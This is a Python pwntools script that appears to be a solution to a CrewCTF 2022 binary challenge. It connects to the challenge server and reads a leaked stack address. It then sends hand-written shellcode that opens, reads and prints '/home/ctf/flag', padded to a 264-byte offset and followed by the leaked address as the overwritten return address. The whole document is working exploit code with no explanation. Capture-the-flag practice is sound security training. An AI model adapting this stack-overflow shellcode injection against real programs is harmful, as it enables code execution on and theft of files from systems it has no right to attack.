from pwn import *

p=remote("wiznu.crewctf-2022.crewc.tf",1337)
# p=process("./chall")


addr=p.recvline().decode()[-13:-1]


shellcode=b"\xeb\x3f\x5f\x80\x77\x0e\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x63\x74\x66\x2f\x66\x6c\x61\x67\x41"

offset=264

# addr=0x7fffffffe240
print(addr)

payload=b""
payload+=shellcode
payload+=b"A"*(offset-len(shellcode))
payload+=p64(int(addr,16))
# payload+=p64(addr)

f=open("temp.in","wb")
f.write(payload)

print(payload)

p.sendline(payload)

p.interactive()
